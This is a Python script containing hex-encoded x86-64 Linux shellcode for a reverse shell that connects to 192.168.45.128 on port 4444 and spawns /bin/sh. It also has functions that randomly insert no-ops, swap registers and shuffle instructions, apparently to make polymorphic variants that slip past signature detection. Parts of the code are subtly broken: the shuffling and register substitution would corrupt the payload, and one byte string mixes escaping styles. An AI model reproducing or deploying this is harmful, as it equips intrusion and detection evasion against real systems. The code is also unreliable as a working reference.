import random

# Base shellcode in hex format
base_shellcode = [
    "\\x31\\xc0", "\\x31\\xdb", "\\x31\\xc9", "\\x31\\xd2", "\\x31\\xff", "\\x31\\xf6",
    "\\xb0\\x29", "\\x40\\xb7\\x02", "\\x40\\xb6\\x01", "\\xb2\\x06", "\\x0f\\x05",
    "\\x49\\x89\\xc0", "\\x48\\x83\\xec\\x08", "\\xc6\\x04\\x24\\x02", "\\x66\\xc7\\x44\\x24\\x02\\x11\\x5c",
    "\\xc7\\x44\\x24\\x04\\xc0\xa8\\x2d\\x80", "\\x48\\x89\\xe6", "\\xb2\\x10", "\\x41\\x50", "\\x5f",
    "\\xb0\\x2a", "\\x0f\\x05", "\\xb0\\x21", "\\x41\\x50", "\\x5f", "\\x48\\x31\\xf6", "\\x0f\\x05",
    "\\xb0\\x21", "\\x41\\x50", "\\x5f", "\\x40\\xb6\\x01", "\\x0f\\x05", "\\xb0\\x21", "\\x41\\x50", "\\x5f",
    "\\x40\\xb6\\x02", "\\x0f\\x05", "\\x48\\x31\\xf6", "\\x56", "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68",
    "\\x57", "\\x54", "\\x5f", "\\xb0\\x3b", "\\x99", "\\x0f\\x05"
]

# Obfuscation techniques
def apply_random_obfuscation(shellcode):
    obfuscation_techniques = [
        lambda x: ["\\x90"] + x,  # Add no-op at the beginning
        lambda x: x + ["\\x90"],  # Add no-op at the end
        lambda x: x[:1] + ["\\x90"] + x[1:],  # Add no-op after the first instruction
        lambda x: ["\\x87\\xc0"] + x,  # xchg eax, eax (no-op equivalent)
        lambda x: x[:2] + ["\\x87\\xc3"] + x[2:],  # xchg eax, ebx (no-op equivalent)
        lambda x: x[:3] + ["\\x40"] + x[3:],  # inc eax
        lambda x: x[:4] + ["\\x48\\xff\\xc0"] + x[4:],  # inc rax
        lambda x: ["\\x48\\x31\\xc0"] + x  # xor rax, rax
    ]
    technique = random.choice(obfuscation_techniques)
    return technique(shellcode)

def shuffle_instructions(shellcode):
    part1 = shellcode[:6]
    part2 = shellcode[6:]
    random.shuffle(part2)
    return part1 + part2

def substitute_registers(shellcode):
    substitutions = {
        "\\x31\\xc0": ["\\x31\\xd2", "\\x31\\xdb"],
        "\\x31\\xdb": ["\\x31\\xc9", "\\x31\\xd2"],
        "\\x31\\xc9": ["\\x31\\xd2", "\\x31\\xdb"],
        "\\x31\\xd2": ["\\x31\\xc9", "\\x31\\xdb"],
        "\\x31\\xff": ["\\x31\\xf6"],
        "\\x31\\xf6": ["\\x31\\xff"]
    }
    for i in range(len(shellcode)):
        if shellcode[i] in substitutions:
            shellcode[i] = random.choice(substitutions[shellcode[i]])
    return shellcode

# Apply obfuscation multiple times for better variability
def multiple_obfuscations(shellcode, iterations=3):
    for _ in range(iterations):
        shellcode = apply_random_obfuscation(shellcode)
        shellcode = shuffle_instructions(shellcode)
        shellcode = substitute_registers(shellcode)
    return shellcode

# Apply obfuscation
shellcode = base_shellcode.copy()
shellcode = multiple_obfuscations(shellcode)

# Print the obfuscated shellcode
print("".join(shellcode))
